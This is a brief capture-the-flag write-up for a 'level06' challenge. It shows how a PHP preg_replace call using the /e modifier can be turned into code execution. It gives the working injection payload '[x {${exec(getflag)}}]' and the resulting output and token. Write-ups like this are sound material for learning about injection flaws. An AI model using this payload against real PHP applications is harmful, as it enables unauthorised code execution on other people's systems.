When we ls we found a php script and a file that execute the script with a file as argument.
We create a file in the /var/tmp directory and execute the script.
It work, the script print what we put in our txt filre in /var/tmp/.
So now let's try to find how to execute "getflag".

First we tried to break `print` function in the script.
Did not work, so we saw this line : 
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
The /e execute a command, so we juste need to excecute our command this way ! 
So we tried [e  getflag], "[e  getflag]", [e  `getflag`] but these did not work.
I tried to use the exec command like this : [e  exec(getflag)], [e  exec(`getflag`)]
Then with some research i found that `$` could proabably help me.
I tryed to understand how Php treat commands and strings.
With research i found that the good syntax was : '[x {${exec(getflag)}}]'
When i execute the script : 

PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

We have our token : wiok45aaoguiboiki2tuin6ub